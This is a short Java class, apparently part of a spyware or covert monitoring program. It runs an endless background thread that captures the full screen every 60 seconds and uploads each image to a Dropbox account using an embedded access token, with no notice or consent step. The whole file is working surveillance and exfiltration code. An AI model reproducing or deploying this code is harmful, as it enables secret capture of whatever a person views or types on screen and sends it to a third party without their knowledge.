package com.company;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.awt.image.DataBufferByte;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.io.FileInputStream;
import java.io.InputStream;

public class TakeScreenshot extends Thread {
    @Override
    public void run() {
        // Input your token to connect with your dropbox
        String ACCESS_TOKEN = " ";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        Robot robot = null;
        try {
            robot = new Robot();
        } catch (AWTException e) {
            e.printStackTrace();
        }

        for(;;) {
            SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
            Date today = new Date();
            String imageName = formatter.format(today);
            Rectangle capture =  new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage image = robot.createScreenCapture(capture);
            try {
                ByteArrayOutputStream os = new ByteArrayOutputStream();
                ImageIO.write(image, "png", os);
                InputStream is = new ByteArrayInputStream(os.toByteArray());
                client.files().uploadBuilder("/" + imageName + ".png").uploadAndFinish(is);
                sleep(60000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
